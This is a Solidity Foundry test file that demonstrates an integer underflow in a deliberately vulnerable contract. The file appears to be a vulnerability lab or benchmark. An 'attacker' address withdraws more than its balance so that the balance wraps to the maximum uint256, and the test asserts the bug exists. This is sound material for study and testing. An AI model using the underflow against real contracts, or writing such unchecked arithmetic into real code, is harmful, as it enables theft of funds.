// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/integer_overflow_minimal.sol";

contract IntegerOverflowMinimalTest is Test {
    IntegerOverflowMinimal public overflowContract;
    address attacker = address(0x1337);

    function setUp() public {
        overflowContract = new IntegerOverflowMinimal();
    }

    function testIntegerUnderflow() public {
        // First initialize count to 1 by running with input 0
        vm.prank(attacker);
        overflowContract.run(0);
        
        // Verify initial balance is 1
        uint256 initialBalance = overflowContract.getUserBalance(attacker);
        assertEq(initialBalance, 1, "Initial balance should be 1");

        // Differential check: Get balance BEFORE attack
        console.log("--- BEFORE-Trigger Balance ---");
        uint256 preAttackBalance = overflowContract.getUserBalance(attacker);
        console.log("Pre-attack balance:", preAttackBalance);

        console.log("--- Trigger Underflow Attack (run(2)) ---");
        // Attacker triggers underflow by withdrawing more than their balance
        vm.prank(attacker);
        overflowContract.run(2); // Trying to subtract 2 from 1

        // Differential check: Get balance AFTER attack
        console.log("--- AFTER-Trigger Balance ---");
        uint256 postAttackBalance = overflowContract.getUserBalance(attacker);
        console.log("Post-attack balance:", postAttackBalance);

        // Vulnerability verification
        if (postAttackBalance == type(uint256).max) {
            console.log("Vulnerability Exists: Underflow caused balance to become max uint256 value");
        } else {
            console.log("Vulnerability not Exist: Underflow did not occur");
        }

        // Keep original test assertion
        assertEq(
            postAttackBalance, 
            type(uint256).max, 
            "Balance should underflow to max uint256 value"
        );
    }

    function testResetCount() public {
        // Initialize count to 1
        vm.prank(attacker);
        overflowContract.run(0);
        
        // Trigger the underflow
        vm.prank(attacker);
        overflowContract.run(2);

        // Reset the count - should set count back to 0
        vm.prank(attacker);
        overflowContract.resetCount();

        // Verify count is reset by checking new operation
        vm.prank(attacker);
        overflowContract.run(0);
        
        uint256 balanceAfterReset = overflowContract.getUserBalance(attacker);
        assertEq(balanceAfterReset, 1, "Balance should be reset and new operation should set to 1");
    }
}